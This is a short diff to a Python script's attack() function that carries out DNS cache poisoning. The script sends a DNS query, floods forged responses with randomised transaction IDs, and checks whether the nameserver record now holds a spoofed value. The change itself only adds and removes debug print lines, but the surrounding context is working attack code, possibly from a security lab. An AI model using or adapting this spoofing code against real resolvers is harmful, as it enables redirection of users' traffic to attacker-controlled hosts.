@@ -81,19 +81,17 @@ def attack():
         fake_response[DNS].qd.qname = url
         fake_response[DNS].an.rrname = url
         print "Now trying %s\n" % url
-        print fake_response.show()
 
         # send dns query
         sendPacket(sock, dns_request, my_ip, dns_port)
-        print "Request sent\n", dns_request.show()
         for i in range(50):
             fake_response[DNS].id = getRandomTXID()
             sendPacket(sock, fake_response, my_ip, query_port)
-            print fake_response[DNS].id
 
         # check to see if it worked
         # sendPacket(sock, dns_request, my_ip, dns_port)
         response = sock.recv(4096)
+        print response
         response = DNS(response)
         try:
             if response[DNS].ns.rdata == spoof:
